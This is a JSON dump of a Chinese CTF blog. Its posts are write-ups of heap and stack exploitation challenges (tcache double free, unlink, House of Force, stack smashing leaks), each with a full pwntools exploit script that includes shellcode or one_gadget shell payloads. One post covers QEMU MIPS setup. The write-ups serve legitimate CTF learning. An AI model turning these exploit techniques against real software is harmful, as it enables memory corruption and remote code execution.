{"meta":{"title":"Limu's Blog","subtitle":"","description":"一个小Pwn狗的学习之路","author":"Limu","url":"https://limu.ltd","root":"/"},"pages":[{"title":"文章归档","date":"2023-05-19T15:55:26.941Z","updated":"2023-03-13T07:46:17.000Z","comments":true,"path":"archives.html","permalink":"https://limu.ltd/archives.html","excerpt":"","text":""},{"title":"links","date":"2023-03-14T12:46:25.000Z","updated":"2023-03-13T07:47:33.000Z","comments":true,"path":"PY.html","permalink":"https://limu.ltd/PY.html","excerpt":"","text":""}],"posts":[{"title":"SWPUCTF_2019","slug":"SWPUCTF-2019","date":"2023-05-29T07:08:44.000Z","updated":"2023-05-29T07:36:59.696Z","comments":true,"path":"2023/05/29/SWPUCTF-2019/","link":"","permalink":"https://limu.ltd/2023/05/29/SWPUCTF-2019/","excerpt":"","text":"p1KkHeap题目分析题目保护 存在沙盒保护，无法直接getshell,故利用其他的函数，进行flag的读取 拖入ghidra分析发现，这个题目存在free后未置空heap地址的问题，故存在use_after_free的漏洞，同时我们可以看到在2.27的libc版本中存在，tcache不会检测double free的漏洞，故，可以利用这个漏洞获取可控指针。 利用思路 1、利用double_free的漏洞，对tcache的计数器（无符号型）进行整数溢出，绕过heap_num &gt; 7的判断，使申请的容器进入unsortbin中，泄漏main_arena的地址，进而获取libc的基地址.2、利用use_after_free的漏洞，修改fd头，控制tcache结构体（在缓冲区）,以此获取一个可控制的指针.3、使用pwntools携带的shellcode功能，将shellcode生成并且写入到程序最开始使用mmap生成的rwx权限的内存，并劫持malloc_hook到这个地址，执行shellcode. 最终exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394# Author by: limu# Terminal: kitty# Tools: pwntools# Usage: python3 exp.py [local or remote] [yes or no] ip portfrom pwn import *from LibcSearcher import *import syscontext.log_level = &quot;debug&quot;context.terminal = [&#x27;kitty&#x27;, &quot;--dump-commands&quot;]context.arch = &#x27;amd64&#x27;s = lambda data :p.send(data)sa = lambda text,data :p.sendafter(text, data)sl = lambda data :p.sendline(data)sla = lambda text,data :p.sendlineafter(text, data)ru = lambda text :p.recvuntil(text)uu32 = lambda :u32(p.recvuntil(b&quot;\\xf7&quot;)[-4:].ljust(4,b&quot;\\x00&quot;))uu64 = lambda :u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;))lg = lambda name,data :p.success(name + b&quot;-&gt; 0x%x&quot; % data)if sys.argv[1] == &#x27;l&#x27;: p = process(&quot;./pwn&quot;)elif sys.argv[1] == &#x27;r&#x27;: p = remote(sys.argv[3], sys.argv[4])else: print(&quot;wrong&quot;) sys.exit()# 启动调试if sys.argv[2] == &#x27;y&#x27;: gdb.attach(p, gdbscript=&#x27;break main&#x27;) pause()def add(size): sla(b&#x27;Your Choice: &#x27;, b&#x27;1&#x27;) sla(b&#x27;size: &#x27;, str(size).encode())def edit(index,content): sla(b&#x27;Your Choice: &#x27;, b&#x27;3&#x27;) sla(b&#x27;id: &#x27;, str(index).encode()) sla(b&#x27;content: &#x27;, content)def free(index): sla(b&#x27;Your Choice: &#x27;, b&#x27;4&#x27;) sla(b&#x27;id: &#x27;, str(index).encode())def show(index): sla(b&#x27;Your Choice: &#x27;, b&#x27;2&#x27;) sla(b&#x27;id: &#x27;, str(index).encode())libc = ELF(&#x27;./libc.so.6&#x27;)elf = ELF(&#x27;./pwn&#x27;)add(0x100)add(0x40)free(0)free(0)show(0)ru(b&#x27;content: &#x27;)heap_addr = u64(p.recvuntil(b&#x27;\\n&#x27;,drop=True).ljust(8,b&#x27;\\x00&#x27;)) - 0x10 - 0x188print(hex(heap_addr))add(0x100)edit(2,p64(heap_addr))add(0x100)add(0x100)rwx_addr=0x66660000edit(4,p64(rwx_addr))add(0x100)shellcode = shellcraft.amd64.open(&#x27;flag&#x27;)shellcode += shellcraft.amd64.read(3,0x66660300,64)shellcode += shellcraft.amd64.write(1,0x66660300,64)edit(5,asm(shellcode))free(0)show(0)ru(b&#x27;content: &#x27;)libc_base = u64(p.recvuntil(b&#x27;\\n&#x27;,drop=True).ljust(8,b&#x27;\\x00&#x27;)) - 0x3ebc40 - 0x60print(hex(libc_base))pause()malloc_hook = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]edit(4,p64(malloc_hook))add(0x100)edit(6,p64(rwx_addr))add(0x100)p.interactive()","categories":[],"tags":[{"name":"CTF刷题记录","slug":"CTF刷题记录","permalink":"https://limu.ltd/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}]},{"title":"Qemu-mips环境配置","slug":"qemu-iot","date":"2023-04-19T14:29:53.000Z","updated":"2023-05-29T07:37:39.099Z","comments":true,"path":"2023/04/19/qemu-iot/","link":"","permalink":"https://limu.ltd/2023/04/19/qemu-iot/","excerpt":"","text":"配置安装mips环境文件系统及内核下载地址：1https://deb.debian.org/debian/dists/bullseye/main/ 创建img镜像储存：1qemu-imgcreate -f qcow2 debian-mipsel.img 30G 创建系统:1qemu-system-mipsel -M malta -kernel vmlinuz-5.10.0-20-4kc-malta -initrd initrd.gz -hda debian-mipsel.img -append &quot;root=/dev/ram console=ttyS0&quot; -nographic 软件支持： ata-modules-5.10.0-20-4kc-malta-dipartman-autopartman-ext3sata-modules-5.10.0-20-4kc-malta-di 提取文件系统123456sudo modprobe nbd max_part=8 sudo qemu-nbd --connect=/dev/nbd0 debian-mipsel.qcow2 sudo mount /dev/nbd0p1 /mntsudo cp -rf /mnt/boot ./sudo umount /mntsudo qemu-nbd -d /dev/nbd0 启动1qemu-system-mipsel -kernel vmlinuz-5.10.0-20-4kc-malta -hda debian-mipsel.qcow2 -append &quot;root=/dev/sda1 console=ttyS0&quot; -nographic --initrd boot/initrd.img-5.10.0-20-4kc-malta 压缩镜像123dd if=/dev/zero of=/zero.dat rm /zero.dat //彻底删除文件qemu-img -O qcow2 debian-mipsel.qcow2 new.qcow2","categories":[],"tags":[{"name":"IoT","slug":"IoT","permalink":"https://limu.ltd/tags/IoT/"}]},{"title":"zctf_2016_note3","slug":"zctf-2016-note3","date":"2023-04-11T07:55:14.000Z","updated":"2023-04-11T08:15:36.000Z","comments":true,"path":"2023/04/11/zctf-2016-note3/","link":"","permalink":"https://limu.ltd/2023/04/11/zctf-2016-note3/","excerpt":"","text":"zctf_2016_note3题目分析简单查看一下，是一个libc-2.23的64位程序，保护中的got表防护没有开，且无pie，堆指针是存在bss的位置。 在add函数出，存在整数溢出，可以申请一个很大的chunk包含下面的chunk，且show函数没有作用。 思路1、通过申请一个极大的chunk来包含下面申请的chunk，然后可以对下面的chunk进行修改，构造unlink。 2、通过unlink攻击修改某个堆指针列表的值后，利用这个指针，对堆指针列表的内容进行修改。 3、修改free的got表为puts函数的地址，打印atoi的got表内容，泄露libc，然后修改atoi函数的got表为system。 排坑1、edit输入的内容，会将最后一个“\\n”修改为“\\0”，所以，我们在修改got表的时候，需要控制输入的内容，防止过多修改。 2、构造unlink攻击时，我们需要修改chunk1和chunk2的大小，并且修改chunk3的prev_size和prev_inuse，这里需要注意，chunk大小要大于0x80（低于0x80就会出一些奇怪的问题） 最终exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364# Author by: limu# Terminal: i3# Tools: pwntools# Usage: python3 exp.py [local or remote] [yes or no] ip portfrom pwn import *from LibcSearcher import *import syscontext.log_level = &quot;debug&quot;context.terminal = [&#x27;i3-sensible-terminal&#x27;, &quot;-e&quot;]context.arch = &#x27;amd64&#x27;elf = ELF(&#x27;./pwn&#x27;)if sys.argv[1] == &#x27;l&#x27;: p = process(&quot;./pwn&quot;)elif sys.argv[1] == &#x27;r&#x27;: p = remote(sys.argv[3], sys.argv[4])else: print(&quot;wrong&quot;) sys.exit()# 启动调试if sys.argv[2] == &#x27;y&#x27;: gdb.attach(p, gdbscript=&#x27;break main&#x27;) pause()def add(size,content): p.sendlineafter(b&#x27;option---&gt;&gt;\\n&#x27;, b&#x27;1&#x27;) p.sendlineafter(b&#x27;(less than 1024)\\n&#x27;, str(size).encode()) p.sendlineafter(b&#x27;content:\\n&#x27;, content)def edit(index,content): p.sendlineafter(b&#x27;option---&gt;&gt;\\n&#x27;, b&#x27;3&#x27;) p.sendlineafter(b&#x27;note:\\n&#x27;, str(index).encode()) p.sendlineafter(b&#x27;content:\\n&#x27;, content)def free(index): p.sendlineafter(b&#x27;option---&gt;&gt;\\n&#x27;, b&#x27;4&#x27;) p.sendlineafter(b&#x27;note:\\n&#x27;, str(index).encode())#libc = ELF(&#x27;/home/limu/Downloads/libc-2.23.so&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)list = 0x6020c8add(0x0,b&#x27;a&#x27;)add(0xa0,b&#x27;b&#x27;)add(0xa0,b&#x27;c&#x27;)add(0xa0,b&#x27;d&#x27;)edit(0,p64(0) * 3 + p64(0xc1) + p64(0) * 23 + p64(0xa1) + p64(list-0x8) + p64(list) + p64(0) * 16 + p64(0xa0) + p64(0xb0))free(3)add(0xa0,b&#x27;dddd&#x27;)edit(2,p64(0) + p64(elf.got[&#x27;free&#x27;]) + p64(elf.got[&#x27;atoi&#x27;]) + p64(elf.got[&#x27;atoi&#x27;]))edit(0,p64(elf.plt[&#x27;puts&#x27;])[:-1])free(2)atoi_addr = u64(p.recvline()[:-1].ljust(8, b&#x27;\\x00&#x27;))base = atoi_addr - libc.symbols[&#x27;atoi&#x27;]system = base + libc.symbols[&#x27;system&#x27;]edit(1,p64(system)[:-1])p.interactive()","categories":[],"tags":[{"name":"CTF刷题记录","slug":"CTF刷题记录","permalink":"https://limu.ltd/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}]},{"title":"hitcon_2018_children_tcache","slug":"hitcon-2018-children-tcache","date":"2023-04-09T01:45:05.000Z","updated":"2023-04-09T03:24:49.000Z","comments":true,"path":"2023/04/09/hitcon-2018-children-tcache/","link":"","permalink":"https://limu.ltd/2023/04/09/hitcon-2018-children-tcache/","excerpt":"","text":"hitcon_2018_children_tcache题目分析题目保护全开，不能修改got表，需要计算泄露libc地址。 部分 RELRO: 在程序装入后，将其中一段 (如.dynamic) 标记为只读，防止程序的一些重定位信息被修改。完全 RELRO: 在部分 RELRO 的基础上，在 程序装入时，直接解析完所有符号并填入对应的值，此时所有的 GOT 表项都已初始化，且不装入 link_map 与_dl_runtime_resolve 的地址 (二者都是程 序动态装载的重要结构和函数)。 运行题目，使用的libc-2.27的libc，有添加，删除，和打印的基础功能，且在strcpy处存在null_by_one的漏洞。 思路分析1、首先申请一个很大的chunk绕过tcache，再在后面申请两个chunk，修改第2个chunk的prev_size位和prev_inuse位。 2、free掉chunk2,这时会在unsortbin中对chunk0和chunk1、2进行合并，触发unlink,然后再把tache的chunk申请回来，这时chunk1就会存main_arean的地址，我们可以通过打印chunk1，泄露libc的基址。 3、利用double_free，对chunk2，free两次后，chunk2的fd会变成自己的chunk地址，然后第一个malloc，将fd位修改为free_hook的位置，然后，第二次malloc，会把堆指向free_hook的位置，第三次进行malloc，会修改free_hook的内容为system。 4、free掉chunk3,成功getshell。 排坑过程 1、首先是第0和chunk，我们需要申请超过0x410的大小，然后第二个chunk，因为只能修改一个字节，且又需要绕过tcache，所以需要申请0x4f0的大小，所以这个chunk2的大小会是0x501,这样就可以覆盖。 2、然后，修改chunk2的prev_size的位每次只能覆盖一个字节，所以需要写一个循环逐个字节覆盖。 3、在泄露libc的过程，我的本地和远程的偏移存在问题，本地的libc和远程的libc的main_arean的不同，而且相对偏移也有问题，本地的libc是0x3dac20 + 0x58的偏移，远程是 0x3ebc40 + 0x60，这里刚好差8个字节。 最终exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# Author by: limu# Terminal: i3# Tools: pwntools# Usage: python3 exp.py [local or remote] [yes or no] ip portfrom pwn import *from LibcSearcher import *import syscontext.log_level = &quot;debug&quot;context.terminal = [&#x27;i3-sensible-terminal&#x27;, &quot;-e&quot;]context.arch = &#x27;amd64&#x27;elf = ELF(&#x27;./pwn&#x27;)if sys.argv[1] == &#x27;l&#x27;: p = process(&quot;./pwn&quot;)elif sys.argv[1] == &#x27;r&#x27;: p = remote(sys.argv[3], sys.argv[4])else: print(&quot;wrong&quot;) sys.exit()# 启动调试if sys.argv[2] == &#x27;y&#x27;: gdb.attach(p, gdbscript=&#x27;break main&#x27;) pause()def add(size,content): p.sendlineafter(b&#x27;Your choice: &#x27;, b&#x27;1&#x27;) p.sendlineafter(b&#x27;Size:&#x27;, str(size).encode()) p.sendlineafter(b&#x27;Data:&#x27;, content)def free(index): p.sendlineafter(b&#x27;Your choice: &#x27;, b&#x27;3&#x27;) p.sendlineafter(b&#x27;Index:&#x27;, str(index).encode())def show(index): p.sendlineafter(b&#x27;Your choice: &#x27;, b&#x27;2&#x27;) p.sendlineafter(b&#x27;Index:&#x27;, str(index).encode())libc = ELF(&#x27;/home/limu/Downloads/libc-2.27.so&#x27;)#libc = ELF(&#x27;./libc.so.6&#x27;)add(0x410,b&#x27;aaaa&#x27;)add(0x88,b&#x27;bbbb&#x27;)add(0x4f0,b&#x27;cccc&#x27;)add(0x10,b&#x27;/bin/sh\\x00&#x27;)free(1)free(0)for i in range(8): add(0x88-i,b&#x27;A&#x27; * (0x88-i)) free(0)add(0x88,b&#x27;a&#x27; * 0x80 + p64(0x4b0))free(2)add(0x410,b&#x27;p&#x27; * 0x419)show(0)#libc_base = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;)) - 0x3dac20 - 0x58 #local#libc_base = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;)) - 0x3ebc40 - 0x58 ##buu testlibc_base = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;)) - 0x3ebc30 - 0x70print(hex(libc_base))free_hook = libc_base + libc.symbols[&#x27;__free_hook&#x27;]system = libc_base + libc.symbols[&#x27;system&#x27;]one = libc_base + 0x4f322 #buu#one = libc_base + 0xfcc6e # localadd(0x88,b&#x27;a&#x27;)free(0)free(2)add(0x88,p64(free_hook))add(0x88,p64(free_hook))add(0x88,p64(one))free(3)p.interactive()","categories":[],"tags":[{"name":"CTF刷题记录","slug":"CTF刷题记录","permalink":"https://limu.ltd/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}]},{"title":"lctf_2016","slug":"lctf-2016","date":"2023-04-07T08:20:34.000Z","updated":"2023-04-07T13:25:46.000Z","comments":true,"path":"2023/04/07/lctf-2016/","link":"","permalink":"https://limu.ltd/2023/04/07/lctf-2016/","excerpt":"","text":"Pwn200分析题目本题没有任何的防护，有两个考虑方向，一个是不涉及堆的解法，另外一个是伪造fastchunk，得到一个可控的指针，进行任意地址写。 利用思路1在输入名字的位置，存在泄露rbp的一个问题，就是在读取不到终止符的情况下，会继续向后输出，所以可以利用这个问题泄露rbp的值。 然后在读取money的位置，存在我们可以利用strcpy的漏洞覆盖local_10的返回值，将free_got的内容修改为shellcode的地址。 注：strcpy函数：strcpy(*dest,*src)，是将src的值写入到dest的里面，且返回dest的指针。 在获取money的函数中，输入56个A后的堆栈情况： 我们可以看到，可以通过输出56个字符后继续输入8个字符修改strcpy复制的目标指针，我们可以选择覆盖free_got的位置为shellcode的位置，然后调用free函数实现getshell。 构造shellcode： 1shellcode_addr + 任意字符*0x30 + free_got地址 exp112345678910111213141516171819202122232425262728293031323334353637383940414243# Author by: limu# Terminal: i3# Tools: pwntools# Usage: python3 exp.py [local or remote] [yes or no] ip portfrom pwn import *from LibcSearcher import *import syscontext.log_level = &quot;debug&quot;context.terminal = [&#x27;i3-sensible-terminal&#x27;, &quot;-e&quot;]context.arch = &#x27;amd64&#x27;elf = ELF(&#x27;./pwn&#x27;)if sys.argv[1] == &#x27;l&#x27;: p = process(&quot;./pwn&quot;)elif sys.argv[1] == &#x27;r&#x27;: p = remote(sys.argv[3], sys.argv[4])else: print(&quot;wrong&quot;) sys.exit()# 启动调试if sys.argv[2] == &#x27;y&#x27;: gdb.attach(p, gdbscript=&#x27;break main&#x27;) pause()shellcode = b&quot;\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05&quot;p1 = shellcode.ljust(48,b&#x27;a&#x27;)p.sendafter(b&#x27;u?\\n&#x27;,p1)p.recv(0x30)addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))print(hex(addr))p.sendlineafter(b&#x27;~~?&#x27;,b&#x27;0&#x27;)p2 = p64(addr-0x50) + b&#x27;a&#x27; * 0x30 + p64(elf.got[&#x27;free&#x27;])p.sendafter(b&#x27;money~&#x27;,p2)p.recv()p.sendline(b&#x27;2&#x27;)p.interactive() 利用思路2通过在栈上构造fake_chunk，覆盖goodbye函数后的return地址（避开原来创建的大小为0x50的chunk）。构造的chunk在栈上的结构： exp21234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253# Author by: limu# Terminal: i3# Tools: pwntools# Usage: python3 exp.py [local or remote] [yes or no] ip portfrom pwn import *from LibcSearcher import *import syscontext.log_level = &quot;debug&quot;context.terminal = [&#x27;i3-sensible-terminal&#x27;, &quot;-e&quot;]context.arch = &#x27;amd64&#x27;elf = ELF(&#x27;./pwn&#x27;)if sys.argv[1] == &#x27;l&#x27;: p = process(&quot;./pwn&quot;)elif sys.argv[1] == &#x27;r&#x27;: p = remote(sys.argv[3], sys.argv[4])else: print(&quot;wrong&quot;) sys.exit()# 启动调试if sys.argv[2] == &#x27;y&#x27;: gdb.attach(p, gdbscript=&#x27;break main&#x27;) pause()shellcode = b&quot;\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05&quot;p1 = shellcode.ljust(48,b&#x27;a&#x27;)p.sendafter(b&#x27;u?\\n&#x27;,p1)p.recv(0x30)addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))print(hex(addr))fake = addr - 0x90code1 = addr - 0x50p.sendlineafter(b&#x27;~~?&#x27;,b&#x27;0&#x27;)p.recv()p.sendline(p64(0) * 5 + p64(0x41) + p64(0) + p64(fake))p.sendlineafter(b&#x27;choice : &#x27;,b&#x27;2&#x27;)p.sendlineafter(b&#x27;choice : &#x27;,b&#x27;1&#x27;)p.sendlineafter(b&#x27;\\n&#x27;,b&#x27;48&#x27;)p3 = b&#x27;a&#x27; * 0x18 + p64(code1)p3 = p3.ljust(48, b&#x27;\\x00&#x27;)p.sendlineafter(b&#x27;48\\n&#x27;,p3)p.sendlineafter(b&#x27;choice : &#x27;,b&#x27;3&#x27;)p.interactive()","categories":[],"tags":[{"name":"CTF刷题记录","slug":"CTF刷题记录","permalink":"https://limu.ltd/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}]},{"title":"gyctf_2020刷题","slug":"gyctf-2020","date":"2023-03-27T02:32:51.000Z","updated":"2023-04-02T13:22:57.000Z","comments":true,"path":"2023/03/27/gyctf-2020/","link":"","permalink":"https://limu.ltd/2023/03/27/gyctf-2020/","excerpt":"","text":"gyctf_2020_force分析题目这个题目仅有add函数可用，并且会返回chunk的地址，而puts函数是没有作用的，所以这里考虑使用top chunk来泄露libc的基地址 利用方式1、当程序申请一个足够大的chunk的时候，会调用mmap在紧挨libc上方位置申请一个chunk块，所以只需要进行一个简单的计算，就可以得到libc的基地址。 1add(0x200000,b&#x27;aaaa&#x27;) + 0x200ff0 2、当申请一个chunk的时候，在已有的内存找不到合适，或者组合的内存时，会从top chunk中切割一部分，我们通过溢出修改top chunk的大小，来实现chunk覆盖，从而修改指针。 3、因为程序开启了got表的防护，所以，这里需要劫持malloc_hook为one_gadget，因为one_gadget需要一些特殊的条件，所以我们这里首先让栈帧平衡，在这里，我们使用了调用realloc前，对栈帧的一些平衡的操作，然后在使用one_gadget，所以，这样的话，我们只需要将malloc_hook的地址修改为realloc前的一部分地址，然后修改realloc_hook的地址为one_gadget,这样的话，就能成功getshell。 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677# Author by: limu# Terminal: i3# Tools: pwntools# Usage: python3 exp.py [local or remote] [yes or no] ip portfrom pwn import *from LibcSearcher import *import syscontext.log_level = &quot;debug&quot;context.terminal = [&#x27;i3-sensible-terminal&#x27;, &quot;-e&quot;]context.arch = &#x27;amd64&#x27;elf = ELF(&#x27;./pwn1&#x27;)if sys.argv[1] == &#x27;l&#x27;: p = process(&quot;./pwn1&quot;)elif sys.argv[1] == &#x27;r&#x27;: p = remote(sys.argv[3], sys.argv[4])else: print(&quot;wrong&quot;) sys.exit()# 启动调试if sys.argv[2] == &#x27;y&#x27;: gdb.attach(p, gdbscript=&#x27;break main&#x27;) pause()# def exec_fmt(payload):# p.sendline(payload)# info = p.recv()# return info# auto = FmtStr(exec_fmt)# offset = auto.offsetdef add(size,content): p.sendlineafter(b&#x27;\\n&#x27;, b&#x27;1&#x27;) p.sendlineafter(b&#x27;\\n&#x27;, str(size).encode()) p.recvuntil(b&#x27;0x&#x27;) addr = int(b&#x27;0x&#x27; + p.recvuntil(b&#x27;\\n&#x27;),16) p.sendlineafter(b&#x27;\\n&#x27;, content) return addr# def edit(index1,index2,content):# p.sendlineafter(b&#x27;&gt;&gt;\\n&#x27;, b&#x27;3&#x27;)# p.sendlineafter(b&#x27;\\n&#x27;, str(index1).encode())# p.sendlineafter(b&#x27;\\n&#x27;, str(index2).encode())# p.sendlineafter(b&#x27;TheNewContents:&#x27;, content)# def free(index):# p.sendlineafter(b&#x27;&gt;&gt;\\n&#x27;, b&#x27;4&#x27;)# p.sendlineafter(b&#x27;\\n&#x27;, str(index).encode())# def show(index):# p.sendlineafter(b&#x27;&gt;&gt;\\n&#x27;,b&#x27;2&#x27;)# p.sendlineafter(b&#x27;\\n&#x27;, str(index).encode())#libc = ELF(&#x27;/home/limu/Downloads/libc-2.23.so&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)base = add(0x200000,b&#x27;aaaa&#x27;) + 0x200ff0addr = add(0x18,p64(0) * 3 + p64(0xFFFFFFFFFFFFFFFF))top_addr = top_last_addr + 0x10offset = base + libc.symbols[&quot;__malloc_hook&quot;] - top_addr - 0x30one_gadget = base + 0x4525arealloc_addr = base + libc.symbols[&quot;__libc_realloc&quot;]add(offset,b&#x27; &#x27;) add(0x10,b&#x27;a&#x27; * 8 + p64(one_gadget) + p64(realloc_addr + 0x10))p.sendlineafter(b&#x27;\\n&#x27;, b&#x27;1&#x27;)p.sendlineafter(b&#x27;\\n&#x27;, b&#x27;16&#x27;)p.interactive() gyctf_2020_signin分析题目这个题目存在后门backdoor，所以我们只需要满足条件，使ptr不等于0。 然后我们看一下使用的libc是18.04版本的，相对于16.04,其中更新了tcache机制，即我们可以利用： 1、tcache仅有7个指针储存，当我们申请7个chunk并且free后，就可以填满tcache。 2、分配fastbin中的chunk时，如果还有其他相同大小的fastbin_chunk，则把它们全部放入tcache中。 3、calloc不会分配tcache中的chunk。 利用方式所以这个题目的利用方式也就出来了，利用calloc不会分配tcache的这个机制，伪造一个fastbin_chunk的fd，利用fastbin attche的方式，修改目标位置的内存。 1、首先申请8个chunk，然后依次释放，这时，会有一个chunk因为tcache塞满，进入了fastbin中，也就是chunk7。 2、然后我们申请chunk8，此时，这个chunk会从tcache中取出，tcache会有一个空缺的位置（申请的chunk8和chunk6的地址会是相同的）。 3、然后我们修改chunk7的fd，然后利用calloc申请一个堆的操作，认为fd指向的位置为另外一个fastbin_chunk，所以会修改fd指向fake_chunk的fd，将fd指向的chunk放入tcache中。 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677# Author by: limu# Terminal: i3# Tools: pwntools# Usage: python3 exp.py [local or remote] [yes or no] ip portfrom pwn import *from LibcSearcher import *import syscontext.log_level = &quot;debug&quot;context.terminal = [&#x27;i3-sensible-terminal&#x27;, &quot;-e&quot;]context.arch = &#x27;i386&#x27;elf = ELF(&#x27;./pwn&#x27;)if sys.argv[1] == &#x27;l&#x27;: p = process(&quot;./pwn&quot;)elif sys.argv[1] == &#x27;r&#x27;: p = remote(sys.argv[3], sys.argv[4])else: print(&quot;wrong&quot;) sys.exit()# 启动调试if sys.argv[2] == &#x27;y&#x27;: gdb.attach(p, gdbscript=&#x27;break main&#x27;) pause()# def exec_fmt(payload):# p.sendline(payload)# info = p.recv()# return info# auto = FmtStr(exec_fmt)# offset = auto.offsetdef add(index): p.sendlineafter(b&#x27;your choice?&#x27;, b&#x27;1&#x27;) p.sendlineafter(b&#x27;idx?\\n&#x27;, str(index).encode())def edit(index,content): p.sendlineafter(b&#x27;your choice?&#x27;, b&#x27;2&#x27;) p.sendlineafter(b&#x27;idx?\\n&#x27;, str(index).encode()) p.send(content)def free(index): p.sendlineafter(b&#x27;your choice?&#x27;, b&#x27;3&#x27;) p.sendlineafter(b&#x27;idx?\\n&#x27;, str(index).encode())# def show(index):# p.sendlineafter(b&#x27;&gt;&gt;\\n&#x27;,b&#x27;2&#x27;)# p.sendlineafter(b&#x27;\\n&#x27;, str(index).encode())#libc = ELF(&#x27;/home/limu/Downloads/libc-2.27.so&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;) add(0)add(1)add(2)add(3)add(4)add(5)add(6)add(7)free(0)free(1)free(2)free(3)free(4)free(5)free(6)free(7)add(8)payload = p64(0x4040c0-0x10)edit(7, payload)p.sendlineafter(b&#x27;your choice?&#x27;, b&#x27;6&#x27;)p.interactive()","categories":[],"tags":[{"name":"CTF刷题记录","slug":"CTF刷题记录","permalink":"https://limu.ltd/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}]},{"title":"Canary专题","slug":"Canary专题","date":"2023-03-23T09:01:14.000Z","updated":"2023-03-27T03:05:21.000Z","comments":true,"path":"2023/03/23/Canary专题/","link":"","permalink":"https://limu.ltd/2023/03/23/Canary%E4%B8%93%E9%A2%98/","excerpt":"","text":"SP1 利用stack smashing detected 例题：wdb2018_guess注：本题目使用libc-2.23.so的libc，使用其他或者高版本的libc是无效的，建议使用patchelf修改libc 题目思路本题有canary，存在fget函数读取任意长度字符串造成的栈溢出的问题，考虑到canary检查不符合的时候引起程序的crash后，会打印程序名，而程序名作为arg[0]，存在于stack上，故，可以考虑覆盖arg[0]，实现泄露任意地址，然后通过计算flag的相对偏移，通过smash打印出flag的内容。 流程1、通过覆盖arg[0]为puts的got表地址，获得程序的基础偏移2、通过覆盖arg[0]为__enviorn的地址，获得栈地址（enviorn 是环境变量表，里面包含栈地址）3、通过覆盖arg[0]为flag的地址，获得flag，（计算flag相对与栈的位置） 最终exp1234567891011121314151617181920212223242526272829303132333435363738394041424344##Author by: limu##Terminal: i3##Tools: pwntools##Usage: python3 exp.py [local or remote] [yes or no] ip portfrom pwn import *from LibcSearcher import *import syscontext.log_level = &quot;debug&quot;context.terminal = [&#x27;i3-sensible-terminal&#x27;,&quot;-e&quot;]context.arch = &#x27;amd64&#x27;elf = ELF(&#x27;./pwn&#x27;)if sys.argv[1] == &#x27;l&#x27;: p = process(&quot;./pwn&quot;) elif sys.argv[1] == &#x27;r&#x27;: p = remote(sys.argv[3],sys.argv[4]) else: print(&quot;wrong&quot;) sys.exit()##启动调试if sys.argv[2] == &#x27;y&#x27;: gdb.attach(p,gdbscript=&#x27;break main&#x27;) pause()#libc = ELF(&#x27;./libc.so.6&#x27;)p.sendlineafter(b&#x27;lease type your guessing flag&#x27;, b&#x27;a&#x27;*0x128+p64(elf.got[&#x27;puts&#x27;]))puts = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;puts&#x27;,puts)base = puts - libc.dump(&#x27;puts&#x27;)environ_addr= base + libc.dump(&#x27;__environ&#x27;)p.sendlineafter(b&#x27;lease type your guessing flag&#x27;, b&#x27;a&#x27; * 0x128 + p64(environ_addr))stack_addr=u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))p.sendlineafter(b&#x27;lease type your guessing flag&#x27;, b&#x27;a&#x27; * 0x128 + p64(stack_addr-360))p.interactive()","categories":[],"tags":[{"name":"CTF刷题记录","slug":"CTF刷题记录","permalink":"https://limu.ltd/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}]},{"title":"hitcon2014_stkof","slug":"hitcon2014-stkof","date":"2023-03-16T07:26:02.000Z","updated":"2023-03-27T03:06:34.000Z","comments":true,"path":"2023/03/16/hitcon2014-stkof/","link":"","permalink":"https://limu.ltd/2023/03/16/hitcon2014-stkof/","excerpt":"","text":"Unlink机制研究分析题目首先题目是一个使用libc-2.23.so的64位程序，程序没有开启GOT表的保护，修改加载的ld和libc后，试着运行程序，但是无显示，通过源码大致判断了下程序功能，是一个经典的堆选项的题目。 在向chunk写入的函数中我们可以看到，存在任意长度写入的问题，我们可以任意写入内容溢出至下一个chunk。 基本思路程序在最开始的时候没有设置IO缓冲区，所以会在第一个chunk前后申请两个chunk作为缓冲区，我们可以申请一个先堆快，释放两个缓冲区的内容。 在程序中，存在一个全局变量在0x00602140，储存了所有申请chunk的data区域的地址，如果可以在这个位置伪造一个fake_chunk，我们就可以得到一个可以自由控制的指针，改变程序的运行。 